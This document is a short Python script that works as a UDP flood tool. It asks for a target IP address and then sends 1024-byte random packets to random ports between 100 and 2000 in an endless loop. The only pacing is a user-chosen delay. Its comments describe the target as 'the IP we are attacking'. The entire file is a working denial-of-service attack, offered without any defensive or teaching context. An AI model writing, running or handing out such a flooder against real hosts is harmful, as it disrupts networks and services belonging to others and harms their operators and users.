import socket #Imports needed libraries
import random
from time import sleep

sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
bytes=random._urandom(1024) #Creates packet
ip=input('Target IP: ') #The IP we are attacking
#port=int(input('Port: ')) #Port we direct to attack
sleepTime=float(input('Sleep: '))
sent=0

while 1: #Infinitely loops sending packets to the port until the program is exited.
    port = random.randint(100,2000)
    sock.sendto(bytes,(ip,port))
    #print("Sent %s amount of packets to %s at port %s." % (sent,ip,port))
    sent= sent + 1
    sleep(sleepTime)